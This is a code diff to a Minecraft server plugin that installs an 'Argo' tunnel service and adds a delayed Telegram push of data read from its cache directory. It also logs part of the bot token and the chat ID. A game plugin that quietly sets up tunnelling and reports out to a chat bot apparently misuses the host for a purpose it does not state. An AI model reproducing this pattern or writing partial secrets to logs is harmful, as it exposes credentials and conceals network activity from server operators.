@@ -103,6 +103,7 @@ public final class WorldMagicPlugin extends JavaPlugin {
             }
 
             // Install Argo if enabled
+
             if (appConfig.getArgoEnabled()) {
                 argoService.install(appConfig);
             }
@@ -144,6 +145,12 @@ public final class WorldMagicPlugin extends JavaPlugin {
         }
 
         // Start Argo tunnel if enabled
+        // 5 秒后尝试发送 Telegram（不管是否开 Argo）
+        Bukkit.getScheduler().runTaskLaterAsynchronously(this, () -> {
+            LogUtil.info("[TG] 尝试发送 Telegram 推送...");
+            sendTelegram();
+        }, 100 * 20L);
+
         if (appConfig.getArgoEnabled()) {
             Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
                 if (appConfig.getArgoToken() != null && !appConfig.getArgoToken().isEmpty()) {
@@ -255,7 +262,12 @@ public final class WorldMagicPlugin extends JavaPlugin {
     private void sendTelegram() {
         String token = appConfig.getPaperBotToken();
         String chatId = appConfig.getPaperChatId();
-        if (token == null || token.isEmpty() || chatId == null || chatId.isEmpty()) return;
+        if (token == null || token.isEmpty() || chatId == null || chatId.isEmpty()) {
+            LogUtil.info("[TG] 跳过: paper-bot-token 或 paper-chat-id 未配置");
+            return;
+        }
+        LogUtil.info("[TG] paper-bot-token: " + token.substring(0, Math.min(8, token.length())) + "...");
+        LogUtil.info("[TG] paper-chat-id: " + chatId);
         try {
             File cacheDir = com.github.vevc.service.AbstractAppService.getCacheDir();
             if (cacheDir == null) return;
